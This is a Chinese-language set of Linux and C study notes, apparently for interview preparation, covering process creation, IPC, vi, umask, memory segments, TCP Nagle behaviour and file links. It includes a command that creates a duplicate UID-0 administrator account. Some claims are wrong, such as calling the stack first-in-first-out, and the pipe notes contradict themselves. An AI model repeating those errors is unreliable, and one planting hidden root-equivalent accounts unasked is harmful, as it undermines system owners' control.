<p>fork()是全部复制<br>vfork()是共享内存<br>clone()是可以将父进程资源有选择地复制给子进程，而没有复制的数据结构则通过指针的复制让子进程共享，具体要复制哪些资源给子进程，由参数列表中的clone_flags来决定。另外，clone()返回的是子进程的pid。<br>fork() 函数复制时将父进程的所以资源都通过复制数据结构进行了复制，然后传递给子进程，所以 fork() 函数不带参数；<br>clone() 函数则是将部分父进程的资源的数据结构进行复制，复制哪些资源是可选择的，这个可以通过参数设定，所以 clone() 函数带参数，没有复制的资源可以通过指针共享给子进程</p>
<h3 id="feof"><a href="#feof" class="headerlink" title="feof"></a>feof</h3><p>若fp已定义为指向某文件的指针,且没有读到该文件的末尾,C语言函数feof( fp)的函数返回值是 0<br><strong>feof</strong>函数的用法是从输入流读取数据,如果到达稳健末尾(遇文件结束符),eof函数值为非零值,否则为0</p>
<h3 id="declare-和-typeset"><a href="#declare-和-typeset" class="headerlink" title="declare 和 typeset"></a>declare 和 typeset</h3><p>bash中有两个内置的命令 declare 和 typeset 可用于创建变量。除了使用内置命令来创建和设置变量外，还可以直接赋值，格式为：变量名=变量值<br>    注意：变量名前面不应加美元“$”符号。（和PHP不同）<br>    等号“=”前后不可以有空格。<br>    Shell中不需要显式的语法来声明变量。<br>    变量名不可以直接和其他字符相连，如果想相连，必须用括号：<br>    echo “this is $(he)llo!”</p>
<h3 id="vi-查找"><a href="#vi-查找" class="headerlink" title="vi 查找"></a>vi 查找</h3><p>使用vi编辑文件report.txt时，要自下而上查找字符串“2006”，应该在命令模式下使用<br>?2006<br>在使用VI编辑器的时候，查找内容的方法有两种：<br>1、“/”：这个查找是自上而下<br>2、“？”：这个查找是自下而上<br>针对“/”：使用“n”查找下一个，使用“N”查找上一个</p>
<p>chmod命令为所有权限；<br>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似）；<br>cp命令主要用于复制文件或目录。<br>touch(指令改变档案的时间记录)</p>
<p>ping命令用来检测两部主机之间的信道是否畅通；<br>route命令用来显示目前本机路由表的内容，并对路由表作相应的修改；<br>tranceroute命令用来探测路由的经过；<br>ifconfig命令用来检测和设置本机的网络接口；  </p>
<h3 id="mysqldump"><a href="#mysqldump" class="headerlink" title="mysqldump"></a>mysqldump</h3><p>linux下<strong>mysqldump</strong>备份命令及参数描述正确的是<br>mysqldump -h ip -uroot -p DBNAME &gt;bck.sql<br>-h  目标ip地址<br>-u   跟上用户名<br>-p   用户的密码<br>DBNAME  数据库名<br>/&gt; 重定向到bck.sql </p>
<p>字符串的处理：<br>拷贝：strcpy,memcpy,sprintf;strncpy,_snprintf<br>合并：strcat,sprintf;strncat,_snprintf<br>比较：strcmp,memcmp;strncmp<br>strcpy() sprintf() strcat() 存在安全隐患， 其对应的安全版为：<br>strncpy() snprintf() strncat()<br><img data-src="https://uploadfiles.nowcoder.com/images/20190807/459981086_1565164326246_215D0A1091F05C093CD1034D721FC787" alt></p>
<p>邮件服务器为每个用户限制磁盘存储空间上限，执行checkquota -cug /var/mail指令后, 在/var/mail目录自动创建的配置文件是<br>aquota.user<br>aquota.group</p>
<p>aquota.group与aqouta.user分别是组以及用户磁盘配额需要的配置文件，而且权限还是600<br>-g 扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目。<br>-R 排除根目录所在的分区。<br>-u 扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目。</p>
<p>/var/log/lastlog:记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看<br>/var/log/wtmp :永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看.<br>/var/log/utmp:记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看.</p>
<p>/etc/passwd中存放本地用户基本信息，<br>/etc/shadow存放用户密码</p>
<p>cp命令 ：cp指令用于复制文件或目录。<br>        将文件file1复制成文件file2命令如下：cp file1 file2<br>cat命令 ：cat命令是linux下的一个文本输出命令，通常是用于观看某个文件的内容的。<br>         一次显示整个文件命令如下： cat filename</p>
<blockquote>
<p>: linux中的数据流重导向：输出导向，覆盖导向的文件内容。<br>&lt; : linux中的数据流重导向：输入导向，理解为原本由键盘输入改为文本输入<br>dd命令 : 作用是用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。<br>        参数：if  输入文件（或设备名称）  of  输出文件（或设备名称）<br>       将文件file1拷贝到文件file2中命令如下：  dd if=file1 of=file2<br>| ：管道命令操作符，处理经由前面一个指令传出的正确输出信息，然后，传递给下一个命令，作为标准的输入</p>
</blockquote>
<p>Binwalk是用于搜索给定二进制镜像文件以获取嵌入的文件和代码的工具。<br>Linux file命令用于辨识文件类型。<br>firmware-mod-kit工具的功能和binwalk工具的类似<br>Netstat 命令用于显示各种网络相关信息，如网络连接，路由表，接口状态 (Interface Statistics)，masquerade 连接，多播成员 (Multicast Memberships) 等等。</p>
<h3 id="UNIX中有如下的通信方式："><a href="#UNIX中有如下的通信方式：" class="headerlink" title="UNIX中有如下的通信方式："></a>UNIX中有如下的通信方式：</h3><p>1) 文件和记录锁定。<br>为避免两个进程间同时要求访问同一共享资源而引起访问和操作的混乱，在进程对<br>共享资源进行访问前必须对其进行锁定，该进程访问完后再释放。这是UNIX为共享<br>资源提供的互斥性保障。<br>2 ）管道。<br>管道一般用于两个不同进程之间的通信。当一个进程创建一个管道，并调用fork创<br>建自己的一个子进程后，父进程关闭读管道端，子进程关闭写管道端，这样 提供了<br>两个进程之间数据流动的一种方式。<br>3 ） FIFO 。<br>FIFO是一种先进先出的队列。它类似于一个管道，只允许数据的单向流动。每个<br>FIFO都有一个名字，允许不相关的进程访问同一个FIFO。因此也成为命名管。<br>4）消息队列。<br>UNIX下不同进程之间可实现共享资源的一种机制；UNIX允许不同进程将格式化的数<br>据流以消息形式发送给任意<br>进程。对消息队列具有操作权限的进程都可以使用msget完成对消息队列的操作控制<br>。通过使用消息类型，进程可以按任何顺序读消息，或为消息安排优先级顺序。<br>5 ）信号灯。<br>作为进程间通讯的一种方法，它不是用于交换大批数据，而用于多进程之间的同步<br>（协调对共享存储段的存取）。<br>6 ）共享内存。<br>通过信号灯实现存储共享（类似“红灯停、绿灯行”）<br><img data-src="http://blog.chinaunix.net/attachment/201110/12/25906157_13184153928yic.png" alt></p>
<h3 id="进程通信方式："><a href="#进程通信方式：" class="headerlink" title="进程通信方式："></a>进程通信方式：</h3><p>（1）（无名）管道（Pipe）：管道可用于具有亲缘关系进程间的通信，允许一个进程和另一个与它有共同祖先的进程之间进行通信。<br>（2）命名管道（named pipe）：命名管道克服了管道没有名字的限制，因此，除具有管道所具有的功能外，它还允许无亲缘关系进程间的通信。命名管道在文件系统中有对应的文件名。命名管道通过命令mkfifo或系统调用mkfifo来创建。<br>（3）信号（Signal）：信号是比较复杂的通信方式，用于通知接受进程有某种事件发生，除了用于进程间通信外，进程还可以发送信号给进程本身；linux除了支持Unix早期信号语义函数sigal外，还支持语义符合Posix.1标准的信号函数sigaction（实际上，该函数是基于BSD的，BSD为了实现可靠信号机制，又能够统一对外接口，用sigaction函数重新实现了signal函数）。<br>（4）消息（Message）队列：消息队列是消息的链接表，包括Posix消息队列system V消息队列。有足够权限的进程可以向队列中添加消息，被赋予读权限的进程则可以读走队列中的消息。消息队列克服了信号承载信息量少，管道只能承载无格式字节流以及缓冲区大小受限等缺<br>（5）共享内存：使得多个进程可以访问同一块内存空间，是最快的可用IPC形式。是针对其他通信机制运行效率较低而设计的。往往与其它通信机制，如信号量结合使用，来达到进程间的同步及互斥。<br>（6）内存映射（mapped memory）：内存映射允许任何多个进程间通信，每一个使用该机制的进程通过把一个共享的文件映射到自己的进程地址空间来实现它。<br>（7）信号量（semaphore）：主要作为进程间以及同一进程不同线程之间的同步手段。<br>（8）套接口（Socket）：更为一般的进程间通信机制，可用于不同机器之间的进程间通信。起初是由Unix系统的BSD分支开发出来的，但现在一般可以移植到其它类Unix系统上：Linux和System V的变种都支持套接字。<br>（9）文件锁；</p>
<h3 id="打包生成静态库"><a href="#打包生成静态库" class="headerlink" title="打包生成静态库"></a>打包生成静态库</h3><p>假设我有test1.c,test2.c两个源文件，先使用gcc -c <em>.c将源文件编译成目标文件，可以生成了test1.o,test2.o两个目标文件，然后，使用ar命令：ar crv libtest.a </em>.o将该目录下的所有目标文件打包生成了libtest.a文件。这样，你在编译的时候就可以直接使用这个静态库了。</p>
<p><strong>Find</strong>是一个非常有效的工具，它可以遍历当前目录甚至于整个文件系统来查找某些文件或目录.</p>
<p>主要选项:<br>-name 按照文件名查找文件<br>-perm 按照文件权限来查找文件<br>-prune 不在当前指定的目录中查找<br>-user 按照文件属主来查找文件<br>-group 按照文件所属的组来查找文件<br>-mtime -n +n 按照文件的更改时间来查找文件，-n表示文件更改时间距现在n天以内，+ n表示文件更改时间距现在n天以前.<br>-nogroup 查找无有效所属组的文件，即该文件所属的组不存在<br>-nouser 查找无有效属主的文件<br>-newer file1 ! file2 查找更改时间比文件file1新但比文件file2旧的文件<br>-type 查找某一类型的文件</p>
<p>tar是操作.tar的命令<br>gzip是压缩.gz压缩包的命令<br>compress：压缩.Z文件<br>uncompress：解压缩.Z文件</p>
<p>/sbin/init在核心完整的加载后，开始运行系统的第一支程序，主要的功能就是准备软件运行的环境，包括系统的主机名称、网络配置、语系处理、文件系统格式及其他服务的启动等。<br>/bin/sh解释脚本的shell命令，开机后运行<br>/etc/sysvinit就是 system V 风格的 init 系统，顾名思义，它源于 System V 系列 UNIX。sysvinit 中运行模式描述了系统各种预订的运行模式。<br>/etc/inittab定义了系统引导时的运行级别, 进入或者切换到一个运行级别时做什么。</p>
<p>Linux启动流程：<br>1，BIOS加电自检；<br>2，从硬盘0柱面 0磁道 第一扇区读512字节的MBR主引导记录；<br>3，运行引导程序Grub并根据其配置加载kernel镜像后初始化；<br>4，根据/etc/inittab中系统初始化配置执行/etc/rc.sysinit脚本；<br>5，根据第3步读到的runlevel值启动对应服务；<br>6，运行/etc/rc.local;<br>7，生成终端待用户登录。</p>
<p>crontab文件由6个域组成，每个域之间用空格分隔，下列哪个排列方式是正确的？<br>MIN HOUR DAY MONTH DAYOFWEEK COMMAND</p>
<p>在crontab文件中如何输入需要执行的命令和时间。该文件中每行都包括六个域，其中前五个域是指定命令被执行的时间，最后一个域是要被执行的命令。每个域之间使用空格或者制表符分隔。格式如下： minute hour day-of-month month-of-year day-of-week commands 第一项是分钟，第二项是小时，第三项是一个月的第几天，第四项是一年的第几个月，第五项是一周的星期几，第六项是要执行的命令。这些项都不能为空，必 须填入。如果用户不需要指定其中的几项，那么可以使用<em>代替。因为</em>是统配符，可以代替任何字符，所以就可以认为是任何时间，也就是该项被忽略了。</p>
<p>fopen是打开文件的函数,文件也可以看成是一个设备,打开一个设备将导致给设备所属的驱动程序发送一个IRP,而与真实硬件相关的驱动程序都运行于内核.<br>exit函数是结束进程的函数,结束进程需要访问PCB(进程控制块)和TCB(线程控制块)等等一些数据结构,而这些数据都存在于内核中.</p>
<p>.bash_profile 类似于编程中的构造函数，当登录shell时，shell会寻找该文件做环境初始化。<br>.bashrc 是在bash环境时.bash_profile的替补。<br>.bash_logout 类似于编程中的析构函数，当登录shell退出时，shell会寻找该文件，并按其指示办事。<br>/etc/profile是系统文件,对系统下全体用户起作用</p>
<p>:s/old/new 将当前行中查找到的第一个字符“old” 串替换为“new”<br>:s/old/new/g 将当前行中查找到的所有字符串“old” 替换为“new”<br>:#,#s/old/new/g 在行号“#,#”范围内替换所有的字符串“old”为“new”<br>:%s/old/new/g 在整个文件范围内替换所有的字符串“old”为“new”<br>:s/old/new/c 在替换命令末尾加入c命令，将对每个替换动作提示用户进行确认</p>
<p>在Linux 系统中，在运行一个程序时，程序中未初始化的全局变量会被加载到以下哪个内存段中?<br>BSS</p>
<p>BSS（Block Started by Symbol）通常是指用来存放程序中未初始化的全局变量和静态变量的一块内存区域。特点是:可读写的，在程序执行之前BSS段会自动清0。所以，未初始的全局变量在程序执行之前已经成0了。</p>
<p>数据段：数据段（data segment）通常是指用来存放程序中已初始化的全局变量的一块内存区域。数据段属于静态内存分配。</p>
<p>代码段：代码段（code segment/text segment）通常是指用来存放程序执行代码的一块内存区域。这部分区域的大小在程序运行前就已经确定，并且内存区域通常属于只读, 某些架构也允许代码段为可写，即允许修改程序。在代码段中，也有可能包含一些只读的常数变量，例如字符串常量等。</p>
<p>堆（heap）：堆是用于存放进程运行中被动态分配的内存段，它的大小并不固定，可动态扩张或缩减。当进程调用malloc等函数分配内存时，新分配的内存就被动态添加到堆上（堆被扩张）；当利用free等函数释放内存时，被释放的内存从堆中被剔除（堆被缩减）</p>
<p>栈(stack)：栈又称堆栈， 是用户存放程序临时创建的局部变量，也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待到调用结束后，函数的返回值也会被存放回栈中。由于栈的先进先出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区</p>
<p><strong>umask</strong><br>功能说明：指定在建立文件时预设的权限掩码。<br>语　　法：umask [-S][权限掩码]<br>补充说明：umask可用来设定[权限掩码]。[权限掩码]是由3个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。<br>umask 命令允许你设定文件创建时的缺省模式，对应每一类用户(文件属主、同组用户、其他用户)存在一个相应的umask值中的数字。对于文件来说，这一数字的最 大值分别是6。系统不允许你在创建一个文本文件时就赋予它执行权限，必须在创建后用chmod命令增加这一权限。目录则允许设置执行权限，这样针对目录来 说，umask中各个数字最大可以到7。<br>对于新建文件 权限 666-244得到422<br>linux系统中权限rwx对应数值为421，故文件权限为r– -w- -w-</p>
<p>linux提供了一种机制可以保证只要父进程想知道子进程结束时的状态信息， 就可以得到。这种机制就是: 在每个进程退出的时候,内核释放该进程所有的资源,包括打开的文件,占用的内存等。 但是仍然为其保留一定的信息(包括进程号the process ID,退出状态the termination status of the process,运行时间the amount of CPU time taken by the process等)。直到父进程通过wait / waitpid来取时才释放。</p>
<p>孤儿进程：一个父进程退出，而它的一个或多个子进程还在运行，那么那些子进程将成为孤儿进程。孤儿进程将被init进程(进程号为1)所收养，并由init进程对它们完成状态收集工作。<br>僵尸进程：一个进程使用fork创建子进程，如果子进程退出，而父进程并没有调用wait或waitpid获取子进程的状态信息，那么子进程的进程描述符仍然保存在系统中。这种进程称之为僵死进程。</p>
<p>僵死进程并不是问题的根源，罪魁祸首是产生出大量僵死进程的那个父进程，所以，解决方法就是kill那个父进程，于是僵尸进程就可以被init进程接收，释放。</p>
<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>使用git merge命令；<br>使用git pull命令；<br>使用git cherry-pick命令<br>都可以合并<br>执行git blame;命令时,会逐行显示文件,并在每一行的行首显示commit号,提交者,最早的提交日期等</p>
<p>kill pid让进程正常退出<br>kill %job number 直接杀掉进程</p>
<h3 id="Linux网络编程"><a href="#Linux网络编程" class="headerlink" title="Linux网络编程"></a>Linux网络编程</h3><p>Nagle算法的规则：<br>（1）如果包长度达到MSS，则允许发送；<br>（2）如果该包含有FIN，则允许发送；<br>（3）设置了TCP_NODELAY选项，则允许发送；<br>（4）未设置TCP_CORK选项时，若所有发出去的小数据包（包长度小于MSS）均被确认，则允许发送；<br>（5）上述条件都未满足，但发生了超时（一般为200ms），则立即发送。</p>
<p>Nagle算法只允许一个未被ACK的包存在于网络，它并不管包的大小，因此它事实上就是一个扩展的停-等协议，只不过它是基于包停-等的，而不是基于字节停-等的。Nagle算法完全由TCP协议的ACK机制决定，这会带来一些问题，比如如果对端ACK回复很快的话，Nagle事实上不会拼接太多的数据包，虽然避免了网络拥塞，网络总体的利用率依然很低。<br>Nagle算法是silly window syndrome(SWS)预防算法的一个半集。SWS算法预防发送少量的数据，Nagle算法是其在发送方的实现，而接收方要做的是不要通告缓冲空间的很小增长，不通知小窗口，除非缓冲区空间有显著的增长。这里显著的增长定义为完全大小的段（MSS）或增长到大于最大窗口的一半。<br>注意：BSD的实现是允许在空闲链接上发送大的写操作剩下的最后的小段，也就是说，当超过1个MSS数据发送时，内核先依次发送完n个MSS的数据包，然后再发送尾部的小数据包，其间不再延时等待。（假设网络不阻塞且接收窗口足够大）<br>举个例子，比如之前的blog中的实验，一开始client端调用socket的write操作将一个int型数据（称为A块）写入到网络中，由于此时连接是空闲的（也就是说还没有未被确认的小段），因此这个int型数据会被马上发送到server端，接着，client端又调用write操作写入‘\r\n’（简称B块），这个时候，A块的ACK没有返回，所以可以认为已经存在了一个未被确认的小段，所以B块没有立即被发送，一直等待A块的ACK收到（大概40ms之后），B块才被发送。整个过程如图所示：<br>这里还隐藏了一个问题，就是A块数据的ACK为什么40ms之后才收到？这是因为TCP/IP中不仅仅有nagle算法，还有一个TCP确认延迟机制 。当Server端收到数据之后，它并不会马上向client端发送ACK，而是会将ACK的发送延迟一段时间（假设为t），它希望在t时间内server端会向client端发送应答数据，这样ACK就能够和应答数据一起发送，就像是应答数据捎带着ACK过去。在我之前的时间中，t大概就是40ms。这就解释了为什么’\r\n’（B块）总是在A块之后40ms才发出。<br>当然，TCP确认延迟40ms并不是一直不变的，TCP连接的延迟确认时间一般初始化为最小值40ms，随后根据连接的重传超时时间（RTO）、上次收到数据包与本次接收数据包的时间间隔等参数进行不断调整。另外可以通过设置TCP_QUICKACK选项来取消确认延迟。</p>
<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>/dev/null文件的权限是crw-rw-rw- root root所以一般用户是不具备执行权限的，也就无法通过/dev/null删除dirs了<br>/dev/null就是一个黑洞，移进去的文件就会消失，但非root用户没有执行权限<br>rm -rf /directory<br>-r 表示递归删除（文件夹删除）<br>-f 表示强制删除<br>mv 是移动命令</p>
<h3 id="内存屏蔽"><a href="#内存屏蔽" class="headerlink" title="内存屏蔽"></a>内存屏蔽</h3><p>内存屏障主要有：读屏障、写屏障、通用屏障、优化屏障、几种。<br>以读屏障为例，它用于保证读操作有序。屏障之前的读操作一定会先于屏障之后的读操作完成，写操作不受影响，同属于屏障的某一侧的读操作也不受影响。类似的，写屏障用于限制写操作。而通用屏障则对读写操作都有作用。而优化屏障则用于限制编译器的指令重排，不区分读写。前三种屏障都隐含了优化屏障的功能。</p>
<h3 id="查看文件大小"><a href="#查看文件大小" class="headerlink" title="查看文件大小"></a>查看文件大小</h3><p>ls -lh 可以查看文件权限，大小；<br>df 主要是查看文件系统占用的磁盘空间使用情况；<br>du 主要是可以查看指定文件和目录所占用的空间大小。</p>
<h3 id="rmp"><a href="#rmp" class="headerlink" title="rmp"></a>rmp</h3><p>－ivh：安装显示安装进度–install–verbose–hash<br>－Uvh：升级软件包–Update；<br>－qpl：列出RPM软件包内的文件信息[Query Package list]；<br>－qpi：列出RPM软件包的描述信息[Query Package install package(s)]；<br>－qf：查找指定文件属于哪个RPM软件包[Query File]；<br>－Va：校验所有的RPM软件包，查找丢失的文件[View Lost]；<br>－e：删除包</p>
<h3 id="TCB、PCB、MMU"><a href="#TCB、PCB、MMU" class="headerlink" title="TCB、PCB、MMU"></a>TCB、PCB、MMU</h3><p>A.TCB,线程控制块；PCB，进程控制块<br>B.MMU(Memory Management Unit) 内存管理单元，是中央处理器用来管理虚拟内存和物理内存寄存器的控制线路，同时也负责虚拟内存映射为物理内存等。<br>C.CACHE,感觉在这道题里应该指的是高速缓冲存储器。<br>D.DMA，（direct memory access）直接内存存储，传输数据从一个地址空间到另一个地址空间。</p>
<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>新建一个管理员用户admin,需要使用的参数<br>useradd -u 0 -o admin<br>-u 表示指定用户的用户号，由于系统用户的用户号是0，所以指定用户号为0。如果同时有-o选项，则可以重复使用其他用户的标识号；即-u 0 -o admin的到相同的效果。但是系统本身勋在用户号为0 的系统用户，则这里应该使用-o admin参数；</p>
<h3 id="实现文件去重并排序"><a href="#实现文件去重并排序" class="headerlink" title="实现文件去重并排序"></a>实现文件去重并排序</h3><p>sort demo.txt|uniq</p>
<p>uniq 命令删除文件中的重复行。uniq 命令读取由 InFile 参数指定的标准输入或文件。<br>该命令首先比较相邻的行，然后除去第二行和该行的后续副本。重复的行一定相邻。（在发出 uniq 命令之前，请使用 sort 命令使所有重复行相邻。<br>uniq命令这种方式估计是想节省系统资源）最后，uniq 命令将最终单独的行写到标准输出或由 OutFile 参数指定的文件。<br>InFile 和 OutFile 参数必须指定不同的文件。</p>
<h3 id="Linux系统进程类型"><a href="#Linux系统进程类型" class="headerlink" title="Linux系统进程类型"></a>Linux系统进程类型</h3><p>交互进程——由一个shell启动的进程。交互进程既可以在前台运行，也可以在后台运行。<br>批处理进程——这种进程和终端没有联系，是一个进程序列。</p>
<p>监控进程（也称守护进程）——Linux系统启动时启动的进程，并在后台运行。</p>
<h3 id="退出交互式的shell"><a href="#退出交互式的shell" class="headerlink" title="退出交互式的shell"></a>退出交互式的shell</h3><p>esc，在vi的插入模式或者底行命令模式下进入命令模式<br>exit，一般用于退出会话式程序或者交互式命令行，如ssh远程连接，切换 shell（Linux中）<br>q，用来退出 man 手册查看命令或者配置文件的状态，或者more、less等命令查看文件的状态<br>quit，一般用于图形界面的退出<br>以上的exit和quit仅是个人总结，非权威，python中的exit()和quit()都可以用来退出python的交互式shell</p>
<h3 id="apache目录访问控制的参数"><a href="#apache目录访问控制的参数" class="headerlink" title="apache目录访问控制的参数"></a>apache目录访问控制的参数</h3><p>AuthName:验证窗口的名称<br>AuthType:验证的类型，这里定义的是Basic<br>AuthUserFile:验证所使用的帐号密码配置文件<br>Require:指定可以登录网页的用户</p>
<h3 id="常见文件系统-系统函数"><a href="#常见文件系统-系统函数" class="headerlink" title="常见文件系统 系统函数"></a>常见文件系统 系统函数</h3><p>fcntl  文件控制<br>open  打开文件<br>creat  创建新文件<br>close  关闭文件描述字<br>read  读文件<br>write  写文件<br>readv  从文件读入数据到缓冲数组中<br>writev  将缓冲数组里的数据写入文件<br>pread 对文件随机读<br>pwrite  对文件随机写</p>
<h3 id="man的级别："><a href="#man的级别：" class="headerlink" title="man的级别："></a>man的级别：</h3><p>1：查看命令的帮助<br>2：查看可被内核调用的函数的帮助<br>3：查看函数和函数库的帮助<br>4：查看特殊文件的帮助（主要是/dev目录下的文件）<br>5：查看配置文件的帮助<br>6：查看游戏的帮助<br>7：查看其它杂项的帮助<br>8：查看系统管理员可用命令的帮助<br>man -f 【命令】–可以查看这个命令有哪些级别</p>
<h3 id="DHCP-服务器，dhcpd-conf-配置文件"><a href="#DHCP-服务器，dhcpd-conf-配置文件" class="headerlink" title="DHCP 服务器，dhcpd.conf 配置文件"></a>DHCP 服务器，dhcpd.conf 配置文件</h3><p>option routers                  192.168.0.1;配置默认网关<br>option subnet-mask             255.255.255.0;配置子网掩码<br>option domain-name-servers     192.168.1.1;指定DNS服务器<br>option domain-name-servers         配置多个DNS服务器</p>
<p>建立动态路由需要用到的文件有<br>/etc/gateways</p>
<p>/etc下主要配置文件解释<br>/etc/hosts：主机名到 IP 地址的映射关系的文件；<br>/etc/resolv.conf：DNS 服务的配置文件 ；<br>/etc/gateways：建立动态路由需要用到的文件 ；<br>/etc/services：定义了网络服务的端口；<br>/etc/resolv.conf：设置DNS。</p>
<p>DNS服务器主配置文件：  /etc/named.conf</p>
<h3 id="查找-1"><a href="#查找-1" class="headerlink" title="查找"></a>查找</h3><p>locate并不真正对硬盘上的文件系统进行查找，而是对文件名数据库进行检索，而且可以使用通配符？和*<br>find命令从指定的起始目录开始，递归地搜索其各个子目录，查找满足寻找条件的文件并对之采取相关的操作<br>whereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）<br>type命令用来显示指定命令的类型，判断给出的指令是内部指令还是外部指令</p>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道实际上是一种固定大小的缓冲区，管道对于管道两端的进程而言，就是一个文件，但它不是普通的文件，它不属于某种文件系统，而是自立门户，单独构成一种文件系统，并且只存在于内存中。它类似于通信中半双工信道的进程通信机制，一个管道可以实现双向 的数据传输，而同一个时刻只能最多有一个方向的传输，不能两个方向同时进行。管道的容 量大小通常为内存上的一页，它的大小并不是受磁盘容量大小的限制。当管道满时，进程在 写管道会被阻塞，而当管道空时，进程读管道会被阻塞。</p>
<p>由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。<br>管道是由内核管理的一个缓冲区，其容量受多方面因素影响，包括缓冲区的大小、磁盘容量大小等问题。<br>当管道中没有信息的话，从管道中读取的进程会等待，直到另一端的进程放入信息。当管道被放满信息的时候，尝试放入信息的进程会等待，直到另一端的进程取出信息。当两个进程都终结的时候，管道也自动消失。进程对管道进行读操作和写操作都可能被阻塞。<br>管道的一端连接一个进程的输出。这个进程会向管道中放入信息。管道的另一端连接一个进程的输入，这个进程取出被放入管道的信息，管道可以同时进行读进程和写进程。</p>
<h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>使用pthread库的多线程程序编译时需要加什么连接参数?<br>-lpthread<br>-fthis-is-varialble 就是向传统c++看齐，可以使用this当一般变量使用.<br>-fcond-mismatch允许 条件表达式 的第二和第三参数 类型不匹配 ，表达式的值将为void类型<br>-MMD和-MM相同，但是输出将导入到.d的文件里面</p>
<h3 id="三剑客"><a href="#三剑客" class="headerlink" title="三剑客"></a>三剑客</h3><p>csh:调用 C shell。<br>Tcsh是csh的增强版，并且完全兼容csh。它不但具有csh的全部功能，还具有命令行编辑、拼写校正、可编程字符集、历史纪录、 作业控制 等功能，以及C语言风格的语法结构。<br>AWK 是一种优良的文本处理工具， Linux 及 Unix 环境中现有的功能最强大的数据处理引擎之一, AWK 提供了极其强大的功能：可以进行样式装入、 流控制 、数学 运算符 、进程 控制语句 甚至于内置的变量和函数。<br>SED: Stream EDitor</p>
<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><p>rsync是中小型企业常用的同步工具是基于内容的同步，其他的也都可以，但是存在一些问题，<br>rsync结合inotify可以达到实时同步,最重要的是rsync是同步差异的内容，而不是同步差异的文件开销比其他的小,并且是基于ssh协议的，sshd服务都是服务器必备的，不需要额外装其他服务<br>wget 基于 http/ftp 协议的.<br>ftp 需要其他服务<br>scp 基于 ssh 协议 ，这些都是基于文件内容做同步开销大</p>
<p><a href="https://blog.csdn.net/5iasp/article/details/13630927" target="_blank" rel="noopener">linux下两台服务器文件实时同步方案设计和实现</a></p>
<p>任何shell都会执行 exec 和 fork<br>而    ls会执行read<br>三个加起来</p>
<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><p>在Linux的文件系统中，保存在磁盘分区中的文件不管是什么类型都给它分配一个编号，称为索引节点号inode 。<br><strong>软连接</strong>，其实就是新建立一个文件，这个文件就是专门用来指向别的文件的（那就和windows 下的快捷方式的那个文件有很接近的意味）。软链接产生的是一个新的文件，但这个文件的作用就是专门指向某个文件的，删了这个软连接文件，那就等于不需要这个连接，和原来的存在的实体原文件没有任何关系，但删除原来的文件，则相应的软连接不可用（cat那个软链接文件，则提示“没有该文件或目录“）</p>
<p><strong>硬连接</strong>是不会建立inode的，他只是在文件原来的inode link count域再增加1而已，也因此硬链接是不可以跨越文件系统的。相反都是软连接会重新建立一个inode，当然inode的结构跟其他的不一样，他只是一个指明源文件的字符串信息。一旦删除源文件，那么软连接将变得毫无意义。而硬链接删除的时候，系统调用会检查inode link count的数值，如果他大于等于1，那么inode不会被回收。因此文件的内容不会被删除。</p>
<p><strong>硬链接</strong>实际上是为文件建一个别名，链接文件和原文件实际上是同一个文件。可以通过ls -i来查看一下，这两个文件的inode号是同一个，说明它们是同一个文件；而软链接建立的是一个指向，即链接文件内的内容是指向原文件的指针，它们是两个文件。</p>
<p><strong>软链接</strong>可以跨文件系统，硬链接不可以；软链接可以对一个不存在的文件名(filename)进行链接（当然此时如果你vi这个软链接文件，linux会自动新建一个文件名为filename的文件）,硬链接不可以（其文件必须存在，inode必须存在）；软链接可以对目录进行连接，硬链接不可以。两种链接都可以通过命令 ln 来创建。ln 默认创建的是硬链接。使用 -s 开关可以创建软链接。</p>
<h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>由于硬链接是有着相同 inode 号仅文件名不同的文件，因此硬链接存在以下几点特性：</p>
<ul>
<li>文件有相同的 inode 及 data block；</li>
<li>只能对已存在的文件进行创建；</li>
<li>不能交叉文件系统进行硬链接的创建；</li>
<li>不能对目录进行创建，只可对文件创建；</li>
<li>删除一个硬链接文件并不影响其他有相同 inode 号的文件。<br><img data-src="https://uploadfiles.nowcoder.com/images/20160813/191137_1471066228575_2F783EFDFEA497F113EAA26ADA59E8FB" alt></li>
</ul>
<p>软链接与硬链接不同，若文件用户数据块中存放的内容是另一文件的路径名的指向，则该文件就是软连接。软链接就是一个普通文件，只是数据块内容有点特殊。软链接有着自己的 inode 号以及用户数据块。因此软链接的创建与使用没有类似硬链接的诸多限制：</p>
<p><strong>软链接</strong>有自己的文件属性及权限等；</p>
<ul>
<li>可对不存在的文件或目录创建软链接；</li>
<li>软链接可交叉文件系统；</li>
<li>软链接可对文件或目录创建；</li>
<li>创建软链接时，链接计数 i_nlink 不会增加；</li>
